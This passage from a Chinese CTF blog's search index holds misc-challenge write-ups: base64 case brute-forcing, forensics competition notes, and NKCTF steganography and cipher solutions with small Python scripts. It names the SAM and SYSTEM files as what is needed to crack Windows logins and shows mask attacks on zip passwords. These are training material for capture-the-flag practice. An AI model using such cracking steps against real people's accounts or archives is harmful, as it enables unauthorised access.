oml5yqo5p2l5ps55lqg5a+55lin5a+55zga44cc5oir5y+j6kkl6yem5pyj5lia5liq5bcp6k6+5ash77ym5y+v5lul6k6/6zeu5yeg5lmo5ywo6yoo55qe5lq657g755+l6k+g44cc5oir5y2055so5a6d5lio5lin6k6k6k+g55qe5lq66l+b6kgm5q+r5peg5osp5lmj55qe5lqj6k6677ym5bm255yl5o6i5aes55qe54wn54mh44cc5b2x5zon57yw56il5pwi546h5pya5asn55qe5zug57sg77ym5lin5piv5l2/55so5l2v56en57yw56il6k+t6kia77ym6icm5piv5pio5pma5l2g55qe552h55yg5piv5zcm5ywf6laz44ccssb3b3jrighhcmqgzxzlcnlkyxkgc28gdghhdcbhbgwgd2hvigxvdmugbwugd2lsbcbizsbwcm91zcbvzibtzseh6z2i5zcr5a+56lgh57yw56il55qe6zeu6aky5piv77ym6buy6k6k5bim5pyj546v5akd44cc5l2g5y+q5ooz6kab5lia5liq6aaz6jwj77ym5l2g5piv5b6x5yiw5lqg5lia5y+q5ou/552a6aaz6jwj55qe5asn54yp54yp77ym55sa6iez6l+y5pyj5pw05liq5lib5p6x44cc5l2g5lin5piv6k6o5y6mj0phdmen77ym5l2g5y+q5piv6k6o5y6m5bel5l2c44cc6icm5bcx5zyo5q2k5pe25oir5bey57up5ooz5lin5ye66aqa6k+d5lqg6l+z5y+v5oco5lmi5yqe5zga77ym5oma5lul5oir5om+576k5y+l5b6b6zug5lqg5lia5lqb6aqa6k+d6l+z5qc35oir5bcx5lin55so57un57ut56cb5a2x5lqg44cctmlnahqgaxmgbmv2zxigzgfyay5jbib0agugbmlnahqsqwxiaxp6awegaxmgc3rpbgwgcmvkllrozsbqbhvzacbxaxn0zxjpysbpcybzdglsbcbwdxjwbgutd2hpdguusxqgagfzig5vdghpbmcgdg8gzg8gd2l0acbuawdodcbvcibkyxkutglrzsxjig1pc3mgew91lel0ighhcybub3roaw5nihrvigrvihdpdgggc3vuc2hpbmugb3igcmfpbi5jdcbkb2vzbid0igv2zw4gbwf0dgvyiglmihlvdsbrbm93ig9yigrvbid0igtub3cuqwx0ag91z2ggssb3awxsihryesb0bybszxqgew91igtub3csvghpbmsgb2ygaxquu28gssbyzwpvawnlzc4g6bur5asc5yw25a6e5luo5p2l5bcx5lin5piv6bur55qe77ym6bur5asc6yem77ym5zci5qyi6iqx6l+y5piv57qi55qe44cc5q+b57us57us55qe57sr6jek6iqx6l+y5piv57sr55m96imy55qe77ym5zkm6bur5asc6l+y5piv55m95asp5rkh5pyj5ywz57o744cc5bcx5yop77ym5oir5ooz5l2g77ym5zkm6bur5asc6l+y5piv55m95asp5rkh5pyj5ywz57o777ym5zkm5pm05asp5zkm5lil6zuo5rkh5pyj5ywz57o777ym55sa6iez5zkm5l2g55+l6ygt5lin55+l6ygt6yo95rkh5pyj5ywz57o777ym5bc9566h5oir6l+y5piv5lya5bc96yep6k6p5l2g55+l6ygt77ym5ooz5yiw6l+z6yem77ym5lqo5piv5qyi5zac44cc&quot;def check_4(base64_part):#base64的原理是3个字符转化成4个字符，也就是4位base64正好对应3个原文，这里检查原文是否在可见字符范围内。        _temp=[]        results=[]        for i in range(4):                if base64_part[i].isalpha():                        _temp.append((base64_part[i].upper(),base64_part[i].lower()))                else:                        _temp.append((base64_part[i],base64_part[i]))        n=map(tuple, itertools.product(_temp[0],_temp[1],_temp[2],_temp[3]))        for i in set(n):                s=&#39;%s%s%s%s&#39;%i                try:                        result=base64.b64decode(s.encode()).decode()                        if result.isprintable():                                results.append(result)                except:                        pass        return(results)l=[]for i in range(int(len(x)/4)):        l.append(check_4(x[i*4:i*4+4]))#print(l)for i in l:        print(i)</code></pre><p>爆破出来后 就会出现很多列表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412151916923.png" alt="image-20230412151916923"></p><p>flag在这部分：</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412152010774.png" alt="image-20230412152010774"></p><p>:horse:ctfshow{base64_1s太难了!!I服了U!}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>精武杯预赛要点</title>
      <link href="/2023/04/07/%E7%B2%BE%E6%AD%A6%E6%9D%AF%E9%A2%84%E8%B5%9B%E8%A6%81%E7%82%B9/"/>
      <url>/2023/04/07/%E7%B2%BE%E6%AD%A6%E6%9D%AF%E9%A2%84%E8%B5%9B%E8%A6%81%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="精武杯预赛要点"><a href="#精武杯预赛要点" class="headerlink" title="精武杯预赛要点"></a>精武杯预赛要点</h1><h2 id="6-操作系统账户”JIANGWU”登陆总次数为："><a href="#6-操作系统账户”JIANGWU”登陆总次数为：" class="headerlink" title="6.操作系统账户”JIANGWU”登陆总次数为："></a>6.操作系统账户”JIANGWU”登陆总次数为：</h2><p>答案为：19</p><p>注意：这里建议从系统痕迹—系统信息—用户信息—用户名—登录次数里面看 不要在帐户登陆里面直接数次数 容易错</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230405093346941.png" alt="image-20230405093346941"></p><p>这里面是18次</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230405093653311.png" alt="image-20230405093653311"></p><p>但真正其实是19次</p><h2 id="8-破解操作系统登录账户及密码所需文件为"><a href="#8-破解操作系统登录账户及密码所需文件为" class="headerlink" title="8.破解操作系统登录账户及密码所需文件为"></a>8.破解操作系统登录账户及密码所需文件为</h2><p>SAM和SYSTEM</p><p>原理性知识 是windows密码的储存文件位置</p><h2 id="10-13题问文件在系统中的储存路径"><a href="#10-13题问文件在系统中的储存路径" class="headerlink" title="10.13题问文件在系统中的储存路径"></a>10.13题问文件在系统中的储存路径</h2><p>建议是创建一个虚拟机 确实的看一下绝对路径 结合取证大师获得正确的答案(取证大师里面是相对路径)</p><p>推荐是虚拟机里面看一下在哪个磁盘中 再将取证大师里面后部分路径直接复制一下 因为虚拟机里面部分路径是中文的 可能和答案不一样</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230405095359440.png" alt="image-20230405095359440"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230405095447239.png" alt="image-20230405095447239"></p><p>比如10题 应该是要Documents 但虚拟机里面显示的是”文档”</p><h2 id="在复习一下bitlocker的解密方法"><a href="#在复习一下bitlocker的解密方法" class="headerlink" title="在复习一下bitlocker的解密方法"></a>在复习一下bitlocker的解密方法</h2><p>在密码&#x2F;密钥检索里面找到bitlocker恢复密钥—跳转源文件—保存到本地—在加密分区中找到bitlocker解密—将密钥文件填进去就能解密</p><h2 id="手机取证的操作方法"><a href="#手机取证的操作方法" class="headerlink" title="手机取证的操作方法"></a>手机取证的操作方法</h2><p>我们是可以在取证大师里面找到两个手机备份相关数据的文件夹 </p><p>打开手机大师—文件取证—手机备份取证 在选择相应的手机平台 文件路径就可以了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230406093400181.png" alt="image-20230406093400181"></p>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NKCTF Misc部分复现</title>
      <link href="/2023/04/03/%5BNKCTF%5DMisc%20wp/"/>
      <url>/2023/04/03/%5BNKCTF%5DMisc%20wp/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSCTF-Misc部分题复现"><a href="#NSSCTF-Misc部分题复现" class="headerlink" title="[NSSCTF]Misc部分题复现"></a>[NSSCTF]Misc部分题复现</h1><h2 id="easy-rgb-montage拼图-gaps恢复顺序-AES加解密"><a href="#easy-rgb-montage拼图-gaps恢复顺序-AES加解密" class="headerlink" title="easy_rgb (montage拼图 gaps恢复顺序 AES加解密)"></a>easy_rgb (montage拼图 gaps恢复顺序 AES加解密)</h2><p>给了一个文件夹和一个有密码的压缩包 文件夹里面有180张小图 考虑用montage拼图后在用gaps拼成正确的图</p><p>使用montage</p><p>首先在kali中cd进小图所在的文件夹 将小图的总数分解 比如该题180张分为15*12(能分成正方形最好是正方形) 命令为：</p><p>montage *.png -tile 15x12 -geometry +0+0 flag.png</p><p>就可以在文件夹中找到这个拼接好的图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190412049.png" alt="image-20230403190412049"></p><p>然后要用ps 修改图片的长宽为1:1 用较大的数值为边长 是图片为正方形 便于后续size参数的计算</p><p>然后是在kali中使用gaps 恢复正常图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190443685.png" alt="image-20230403190443685"></p><p>命令为：python3 gaps –image&#x3D;flag2.png –size&#x3D;125 –save</p><p>size为正方形小图的边长 刚刚ps的时候改变了整体的长宽 注意此时的小正方形的边长也要发生改变</p><p>得到一个密码：NKCTF2023 用此密码打开刚刚的压缩包得到三个文档r.txt g.txt b.txt</p><p>将三个文档内容放在一起 竖着读（脑洞） 发现是压缩包结构</p><pre><code class="python">f_1=open(&#39;r.txt&#39;,&#39;r&#39;)f_2=open(&#39;g.txt&#39;,&#39;r&#39;)f_3=open(&#39;b.txt&#39;,&#39;r&#39;)r1=f_1.read()r2=f_2.read()r3=f_3.read()for i in range(0, len(r2)-1):    print(r1[i] + r2[i] + r3[i], end=&#39;&#39;)</code></pre><pre><code class="python">504b03041400000008003dba6a5654369fb2420000004000000008000000666c61672e747874f3740aa94cb32c48af0cb22c70760df20932f52bf52fc8f4f70b76370c8b2a28c92d0bf54ccf0fd40f0a712d08890a080b09374a3437b72cc87172f32c4bf6d30600504b010214001400000008003dba6a5654369fb24200000040000000080024000000000000002000000000000000666c61672e7478740a0020000000000001001800c4ecda7d6353d90185c557aa6553d9016a47568f6553d901504b050600000000010001005a0000006800000007004145532d3132</code></pre><p>放在010editor里面 save为压缩包 解压得到一串字符</p><p>IBTyf9pgyR9pCERLR5NuOpiONSG1VZptmvUIgoQ&#x2F;RTEpTZPVTW2a779plBFIvcN+</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230329092048534.png" alt="image-20230329092048534"></p><p>提示是AES加密 不需要偏移量 猜测密钥就是刚刚的NKCTF2023</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230329093224178.png" alt="image-20230329093224178"></p><p>:horse:NKCTF{603fcdfc-652b-40e4-90cf-f27c2edc2d9f}</p><h2 id="easy-word-掩码爆破-lsb隐写"><a href="#easy-word-掩码爆破-lsb隐写" class="headerlink" title="easy_word(掩码爆破 lsb隐写)"></a>easy_word(掩码爆破 lsb隐写)</h2><p>先在给的压缩包中看到了注释 对密码信息进行了提示</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230329180648249.png" alt="image-20230329180648249"></p><p>设置掩码进行爆破</p><p><a href="https://blog.csdn.net/qq_42094992/article/details/102178981?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168008477816800213020232%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=168008477816800213020232&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-102178981-null-null.142%5Ev77%5Econtrol_1,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E8%AE%BE%E7%BD%AE%E6%8E%A9%E7%A0%81%E8%BF%9B%E8%A1%8C%E7%88%86%E7%A0%B4&spm=1018.2226.3001.4187">https://blog.csdn.net/qq_42094992/article/details/102178981?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168008477816800213020232%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168008477816800213020232&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-102178981-null-null.142^v77^control_1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=%E8%AE%BE%E7%BD%AE%E6%8E%A9%E7%A0%81%E8%BF%9B%E8%A1%8C%E7%88%86%E7%A0%B4&amp;spm=1018.2226.3001.4187</a></p><p>(掩码设置可以看这篇)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230329195352821.png" alt="image-20230329195352821"></p><p>得到密码h4evOF90</p><p>打开了加密文档 但是并没有flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230329195747687.png" alt="image-20230329195747687"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230329195834107.png" alt="image-20230329195834107"></p><p>binwalk分离一下  找到了一张图片 拿到key:Welcome_to_NKCTF</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230329195910240.png" alt="image-20230329195910240"></p><p>放到stegsolve中看一下 发现不对劲 是lsb隐写</p><p><img src="https://w3nx1z1.github.io/blogimage@main/image/image-20230329205339042.png" alt="image-20230329205339042"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230329205458115.png" alt="image-20230329205458115"></p><p>密码就是图片中的密码</p><p>得到flag:horse:NKCTF{dc0684dd-5a57-4d47-b9c0-debed0ef28b9}  </p><h2 id="first-spam-of-rabbit-year-与佛论禅-零宽隐写-rot13-rot47-rabbit加解密"><a href="#first-spam-of-rabbit-year-与佛论禅-零宽隐写-rot13-rot47-rabbit加解密" class="headerlink" title="first spam of rabbit year(与佛论禅 零宽隐写 rot13 rot47 rabbit加解密)"></a>first spam of rabbit year(与佛论禅 零宽隐写 rot13 rot47 rabbit加解密)</h2><p>题目已经告诉我们了 这是一个垃圾邮件 翻到最底下 有一串社会主义核心价值观编码：</p><p>法治文明公正民主公正文明公正文明公正敬业法治自由文明富强友善爱国平等爱国友善敬业爱国爱国文明富强公正诚信和谐公正诚信平等法治公正公正平等</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230330135348531.png" alt="image-20230330135348531"></p><p>解码为：rabbit 又 move</p><p>找到一个叫spammimic的网站 可以解密垃圾邮件<a href="https://www.spammimic.com/decode.cgi">spammimic - decoded</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190538577.png" alt="image-20230403190538577"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230330140145317.png" alt="image-20230330140145317"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230330190745310.png"></p><p>试了普通的与佛论禅发现领悟不了佛的真意 尝试是加密的与佛论禅 密码就是rabbit 得到一串字符</p><p><code>&amp;‍‎‏auD5‏‍v&#39;&lt;)‏‍‌</code>h‎‏{dF6C_*’Jrcqzrh&amp;ZaF&gt;<code>g^‏‍‌Hr&#39;&#125;vuHZJB‎‏%~&#125;_H5?gu‌‏‏;q‍‏‌)&quot;&lt;rA?&#123;sH2&#123;IfafKfu=6w_tip:47&amp;13</code></p><p>放在厨子里面看一下 就看到有零宽隐写 在猫捉鱼铃网站上找到在线零宽解密工具</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230330192644150.png" alt="image-20230330192644150"></p><p><code>EnoOoO1G</code>为隐写信息 再刚刚得到的字符串中有tip：47&amp;13 是指rot47和rot13</p><p>对零宽隐写的内容进行rot13解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230330193512665.png" alt="image-20230330193512665"></p><p>得到RabBbB1T</p><p>在对字符串<code>&amp;auD5v&#39;&lt;)</code>h{dF6C_*’Jrcqzrh&amp;ZaF&gt;<code>g^Hr&#39;&#125;vuHZJB%~&#125;_H5?gu;q)&quot;&lt;rA?&#123;sH2&#123;IfafKfu=6w</code>进行rot47解码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230330194602713.png" alt="image-20230330194602713"></p><p>得到<code>U‍‎‏2Fsd‏‍GVkX‏‍‌19‎‏L5uer0YVyC4BKC9U+2um18/‏‍‌wCVNGFw+yq‎‏TON0wdn8F‌‏‏jB‍‏‌XQkCpnLDwaLx727z7FleH</code>进行rabbit解密 拿到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230330200221581.png" alt="image-20230330200221581"></p><pre><code>NKCTF&#123;H4Ppy_tH3_Y34r_0f_R4BbBbbbB1tTtTtT&#125;</code></pre><h2 id="三体-bmp提取信息"><a href="#三体-bmp提取信息" class="headerlink" title="三体(bmp提取信息)"></a>三体(bmp提取信息)</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/%E4%B8%89%E4%BD%93.bmp" alt="三体"></p><p>开局一张bmp图片</p><pre><code class="python">from PIL import Imagedef decode(im):    width,height = im.size    lst = []    for y in range(height):        for x in range(width):            red,green,blue = im.getpixel((x,y))            if(blue | green | red) == 0:                break            index = (green&lt;&lt;8) + blue            lst.append(chr(index))    return &#39;&#39;.join(lst)if __name__==&#39;__main__&#39;:    all_text = decode(Image.open(&quot;三体.bmp&quot;,&quot;r&quot;))    with open (&quot;decode.text&quot;,&quot;w&quot;,encoding = &quot;utf-8&quot;) as f:        f.write(all_text)</code></pre><p>脚本直接提取</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230330202121371.png" alt="image-20230330202121371"></p><p>NKCTF{3d77dc1a37b2d1ebf489c973f554ea10}</p><h2 id="easy-music-openbuff软件-波形频谱隐写"><a href="#easy-music-openbuff软件-波形频谱隐写" class="headerlink" title="easy_music(openbuff软件 波形频谱隐写)"></a>easy_music(openbuff软件 波形频谱隐写)</h2><p>题目提示要有三个密码</p><p>用audacity打开</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230331075747420.png"></p><p>发现psdB：74208645</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230331082045938.png"></p><p>010editor打开在尾部发现psdC：01374890</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230331082234613.png" alt="image-20230331082234613"></p><p>在前面的波形很像二进制 对应二进制数字是</p><pre><code>01110000 01110011 01100100 01000001 00111010 00111000 00110011 00111001 00110111 00111001 00110011 00110110 00110111 </code></pre><p>转为文本(注意为八位算一个字节)</p><p>得到psdA:83979367</p><p>要使用的软件就是openbuff </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230331084007521.png" alt="image-20230331084007521"></p><p>:horse:NKCTF{52d446a51c6896af878f872e0d748118}</p><h2 id="TH-Master-游戏题-作弊器的使用"><a href="#TH-Master-游戏题-作弊器的使用" class="headerlink" title="TH Master(游戏题 作弊器的使用)"></a>TH Master(游戏题 作弊器的使用)</h2><p>游戏题  使用东方星莲船修改器 把分数改成200000000分就OK了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230402121739812.png" alt="image-20230402121739812"></p><p>在replay的th12_01.rpy文件中就可以找到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190622943.png" alt="image-20230403190622943"></p><p>:horse:NKCTF{U_R_re411y_g00d_At_p14ying_t0h0u}</p><h2 id="easy-bmp-爆破出bmp文件的宽度-puzzlesolver工具的使用"><a href="#easy-bmp-爆破出bmp文件的宽度-puzzlesolver工具的使用" class="headerlink" title="easy_bmp(爆破出bmp文件的宽度 puzzlesolver工具的使用)"></a>easy_bmp(爆破出bmp文件的宽度 puzzlesolver工具的使用)</h2><p>打开是一个有密码的压缩包和两张有问题的bmp</p><p>一张直接看出的高度有问题 修改一下得到key的前半段</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190650649.png" alt="image-20230403190650649"></p><p>剩下一张bmp文件名是width提示要修改宽度 选择python脚本来进行爆破 在里面找出最清楚的一张</p><pre><code class="python">import structwith open(&#39;width.bmp&#39;, &#39;rb&#39;) as f:    data = f.read()    width = struct.unpack(&#39;&lt;i&#39;, data[18:22])[0]    height = struct.unpack(&#39;&lt;i&#39;, data[22:26])[0]# 爆破 BMP 文件的宽度for i in range(1000, 1500):    f1 = open(&#39;bpout&#39; + str(i) + &#39;.bmp&#39;, &#39;wb&#39;)    img = data[:18] + struct.pack(&#39;&gt;i&#39;, i)[::-1] + data[22:]    f1.write(img)    f1.close()</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/bpout1404.bmp" alt="bpout1404"></p><p>组合起来就是key：BMP_Height_width_easy</p><p>打开是一张flag.bmp 看到前面图片里的”SAME”猜测也是宽高发生了变化 使用puzzlesolver工具进行处理</p><p>得到一张二维码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190735178.png" alt="image-20230403190735178"></p><p>用sharex扫描一下 得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190804825.png" alt="image-20230403190804825"></p><p>:horse:NKCTF{eab1291e-9e37-4ff1-b76d-f1af63eaad43}</p><h2 id="easypic-用图片做加密容器的密钥-近邻法缩放图片"><a href="#easypic-用图片做加密容器的密钥-近邻法缩放图片" class="headerlink" title="easypic(用图片做加密容器的密钥 近邻法缩放图片)"></a>easypic(用图片做加密容器的密钥 近邻法缩放图片)</h2><p>题目描述：出题人把flag偷偷藏在加密盘里面了，你知道怎么把它还原出来吗</p><p>附件为一张图片 在图片png文件尾后发现藏了东西 可以分离为一张图片和一个vc容器加密盘 密钥文件就是图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190827040.png" alt="image-20230403190827040"></p><p>加密容器里面有一张图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190844383.png" alt="image-20230403190844383"></p><p>隐隐约约可以看见背景图层还是一张图片 又在010editor看见flag.png文件尾有一个tip：566*566 所以用ps将图片尺寸改一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190909663.png" alt="image-20230403190909663"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230403190927078.png" alt="image-20230403190927078"></p><p>得到flag:horse:NKCTF{49ce8740502743585c4a44404e62d8f9}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
